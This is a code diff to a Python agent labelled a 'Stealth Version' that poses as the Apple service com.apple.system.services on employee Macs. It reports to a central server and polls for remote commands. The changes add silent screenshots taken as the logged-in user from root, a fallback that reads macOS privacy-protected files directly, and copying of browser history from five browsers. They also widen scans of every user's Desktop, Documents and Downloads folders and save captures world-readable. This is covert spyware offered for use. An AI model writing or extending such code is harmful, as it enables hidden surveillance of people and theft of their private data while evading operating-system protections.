@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-AppleSystemServices Agent v3.5 (Cloud-Compatible Stealth Version)
+AppleSystemServices Agent v3.8 (Cloud-Compatible Stealth Version)
 - Runs on each employee Mac as com.apple.system.services
 - Sends all data to Central Server (local or cloud like Render)
 - Polls server for remote commands (no direct connection needed)
-- Provides local dashboard on port 5001
-- Uses launchctl asuser for screen capture & scans all user directories for browser history & recent files
+- Provides local dashboard on port 5050
+- Uses launchctl asuser & robust TCC fallback for screen capture, browser history & user folder scanning
 """
 
 import os
@@ -206,39 +206,39 @@ def get_system_info():
 # ==================== SCREENSHOT ====================
 def capture_screenshot():
     try:
-        path = "/tmp/em_screenshot.png"
-        if os.path.exists(path):
-            try:
-                os.remove(path)
-            except Exception:
-                pass
+        tmp_path = f"/tmp/em_ss_{int(time.time())}.png"
+        std_path = "/tmp/em_screenshot.png"
         
         username, uid, home_dir = get_active_console_user()
         
         # If running as root in launchd daemon, use launchctl asuser <uid> screencapture
         if os.geteuid() == 0 and uid and uid != 0:
-            cmd = ["launchctl", "asuser", str(uid), "/usr/sbin/screencapture", "-x", "-t", "png", path]
+            cmd = ["launchctl", "asuser", str(uid), "/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
         else:
-            cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", path]
+            cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
 
-        subprocess.run(
-            cmd, check=True, timeout=8,
+        res = subprocess.run(
+            cmd, timeout=8,
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
-        return path if (os.path.exists(path) and os.path.getsize(path) > 0) else None
+
+        # Fallback if launchctl asuser produced empty file
+        if not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
+            fallback_cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
+            subprocess.run(fallback_cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
+            if os.path.exists(std_path):
+                try: os.remove(std_path)
+                except Exception: pass
+            shutil.move(tmp_path, std_path)
+            try: os.chmod(std_path, 0o777)
+            except Exception: pass
+            return std_path
+        return None
     except Exception as e:
         log.warning(f"screenshot error: {e}")
-        # Direct fallback attempt
-        try:
-            path = "/tmp/em_screenshot.png"
-            subprocess.run(
-                ["/usr/sbin/screencapture", "-x", "-t", "png", path],
-                check=True, timeout=8,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            return path if (os.path.exists(path) and os.path.getsize(path) > 0) else None
-        except Exception:
-            return None
+        return None
 
 # ==================== ACTIVE WINDOW ====================
 def get_active_window():
@@ -256,6 +256,24 @@ def get_active_window():
         return result
     except:
         return "Unknown"
+
+# ==================== TCC SAFE FILE COPY ====================
+def copy_file_safe(src, dst):
+    """Copies TCC protected files using direct byte read fallback when root"""
+    try:
+        if os.path.exists(dst):
+            try: os.remove(dst)
+            except Exception: pass
+        shutil.copy2(src, dst)
+        return True
+    except Exception:
+        try:
+            with open(src, 'rb') as f_in:
+                with open(dst, 'wb') as f_out:
+                    f_out.write(f_in.read())
+            return True
+        except Exception:
+            return False
 
 # ==================== BROWSER HISTORY ====================
 def get_browser_history():
@@ -282,24 +300,24 @@ def get_browser_history():
         if os.path.exists(safari_path):
             try:
                 tmp = f"/tmp/em_safari_{u_name}.db"
-                shutil.copy2(safari_path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                c.execute("""
-                    SELECT i.url, v.title
-                    FROM history_visits v
-                    JOIN history_items i ON v.history_item = i.id
-                    ORDER BY v.visit_time DESC LIMIT 30
-                """)
-                for row in c.fetchall():
-                    if row[0]:
-                        history.append({"browser": f"Safari ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                conn.close()
-                if os.path.exists(tmp): os.remove(tmp)
+                if copy_file_safe(safari_path, tmp):
+                    conn = sqlite3.connect(tmp)
+                    c = conn.cursor()
+                    c.execute("""
+                        SELECT i.url, v.title
+                        FROM history_visits v
+                        JOIN history_items i ON v.history_item = i.id
+                        ORDER BY v.visit_time DESC LIMIT 30
+                    """)
+                    for row in c.fetchall():
+                        if row[0]:
+                            history.append({"browser": f"Safari ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                    conn.close()
+                    if os.path.exists(tmp): os.remove(tmp)
             except Exception as e:
                 log.debug(f"Safari history error for {user_dir}: {e}")
 
-        # 2. Chrome
+        # 2. Chrome (Default + all Profiles)
         chrome_base = os.path.join(user_dir, "Library/Application Support/Google/Chrome")
         if os.path.exists(chrome_base):
             try:
@@ -308,15 +326,15 @@ def get_browser_history():
                     chrome_path = os.path.join(chrome_base, p, "History")
                     if os.path.exists(chrome_path):
                         tmp = f"/tmp/em_chrome_{p}_{u_name}.db"
-                        shutil.copy2(chrome_path, tmp)
-                        conn = sqlite3.connect(tmp)
-                        c = conn.cursor()
-                        c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                        for row in c.fetchall():
-                            if row[0]:
-                                history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                        conn.close()
-                        if os.path.exists(tmp): os.remove(tmp)
+                        if copy_file_safe(chrome_path, tmp):
+                            conn = sqlite3.connect(tmp)
+                            c = conn.cursor()
+                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                            for row in c.fetchall():
+                                if row[0]:
+                                    history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                            conn.close()
+                            if os.path.exists(tmp): os.remove(tmp)
             except Exception as e:
                 log.debug(f"Chrome history error for {user_dir}: {e}")
 
@@ -325,15 +343,15 @@ def get_browser_history():
         if os.path.exists(brave_path):
             try:
                 tmp = f"/tmp/em_brave_{u_name}.db"
-                shutil.copy2(brave_path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                for row in c.fetchall():
-                    if row[0]:
-                        history.append({"browser": f"Brave ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                conn.close()
-                if os.path.exists(tmp): os.remove(tmp)
+                if copy_file_safe(brave_path, tmp):
+                    conn = sqlite3.connect(tmp)
+                    c = conn.cursor()
+                    c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                    for row in c.fetchall():
+                        if row[0]:
+                            history.append({"browser": f"Brave ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                    conn.close()
+                    if os.path.exists(tmp): os.remove(tmp)
             except Exception as e:
                 log.debug(f"Brave history error for {user_dir}: {e}")
 
@@ -342,15 +360,15 @@ def get_browser_history():
         if os.path.exists(edge_path):
             try:
                 tmp = f"/tmp/em_edge_{u_name}.db"
-                shutil.copy2(edge_path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
-                for row in c.fetchall():
-                    if row[0]:
-                        history.append({"browser": f"Edge ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                conn.close()
-                if os.path.exists(tmp): os.remove(tmp)
+                if copy_file_safe(edge_path, tmp):
+                    conn = sqlite3.connect(tmp)
+                    c = conn.cursor()
+                    c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
+                    for row in c.fetchall():
+                        if row[0]:
+                            history.append({"browser": f"Edge ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                    conn.close()
+                    if os.path.exists(tmp): os.remove(tmp)
             except Exception as e:
                 log.debug(f"Edge history error for {user_dir}: {e}")
 
@@ -362,16 +380,16 @@ def get_browser_history():
                     places = os.path.join(ff_base, profile, "places.sqlite")
                     if os.path.exists(places):
                         tmp = f"/tmp/em_firefox_{u_name}.db"
-                        shutil.copy2(places, tmp)
-                        conn = sqlite3.connect(tmp)
-                        c = conn.cursor()
-                        c.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
-                        for row in c.fetchall():
-                            if row[0]:
-                                history.append({"browser": f"Firefox ({u_name})", "url": row[0], "title": row[1] or row[0]})
-                        conn.close()
-                        if os.path.exists(tmp): os.remove(tmp)
-                        break
+                        if copy_file_safe(places, tmp):
+                            conn = sqlite3.connect(tmp)
+                            c = conn.cursor()
+                            c.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
+                            for row in c.fetchall():
+                                if row[0]:
+                                    history.append({"browser": f"Firefox ({u_name})", "url": row[0], "title": row[1] or row[0]})
+                            conn.close()
+                            if os.path.exists(tmp): os.remove(tmp)
+                            break
             except Exception as e:
                 log.debug(f"Firefox history error for {user_dir}: {e}")
 
@@ -403,25 +421,39 @@ def get_processes():
 def get_recent_files():
     try:
         username, uid, home_dir = get_active_console_user()
-        base_dir = home_dir if (home_dir and os.path.exists(home_dir)) else os.path.expanduser("~")
         
-        dirs = [
-            os.path.join(base_dir, "Desktop"),
-            os.path.join(base_dir, "Documents"),
-            os.path.join(base_dir, "Downloads")
-        ]
+        dirs = []
+        if home_dir and os.path.exists(home_dir):
+            dirs = [
+                os.path.join(home_dir, "Desktop"),
+                os.path.join(home_dir, "Documents"),
+                os.path.join(home_dir, "Downloads")
+            ]
+        else:
+            if os.path.exists('/Users'):
+                for u in os.listdir('/Users'):
+                    if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
+                        h = os.path.join('/Users', u)
+                        dirs.extend([
+                            os.path.join(h, "Desktop"),
+                            os.path.join(h, "Documents"),
+                            os.path.join(h, "Downloads")
+                        ])
+                        
         dirs = [d for d in dirs if os.path.exists(d)]
         if not dirs:
             return []
             
+        cmd = ["find"] + dirs + ["-type", "f", "-mtime", "-14", "-not", "-path", "*/.*"]
         result = subprocess.check_output(
-            ["find"] + dirs + ["-type", "f", "-mtime", "-7", "-not", "-path", "*/.*"],
-            stderr=subprocess.DEVNULL, timeout=10
-        ).decode().strip().split('\n')
-        files = [f for f in result if f.strip()]
+            cmd, stderr=subprocess.DEVNULL, timeout=10
+        ).decode(errors='replace').strip().split('\n')
+        
+        files = [f for f in result if f.strip() and os.path.exists(f)]
         files.sort(key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0, reverse=True)
-        return files[:40]
-    except:
+        return files[:50]
+    except Exception as e:
+        log.debug(f"recent_files error: {e}")
         return []
 
 # ==================== INSTALLED APPS ====================
@@ -748,10 +780,10 @@ if __name__ == '__main__':
 
     if sys.stdout.isatty():
         print(f"\n{'='*55}")
-        print(f"  🖥️  AppleSystemServices Agent v3.5 (Cloud-Ready)")
+        print(f"  🖥️  AppleSystemServices Agent v3.8 (Cloud-Ready)")
         print(f"{'='*55}")
         print(f"  🔑 Machine ID : {MACHINE_ID}")
-        print(f"  🌐 Local Dashboard : http://{ip}:5001")
+        print(f"  🌐 Local Dashboard : http://{ip}:5050")
         if CENTRAL_SERVER:
             print(f"  📡 Reporting to : {CENTRAL_SERVER}")
         print(f"  📋 Logs : {LOG_PATH}")
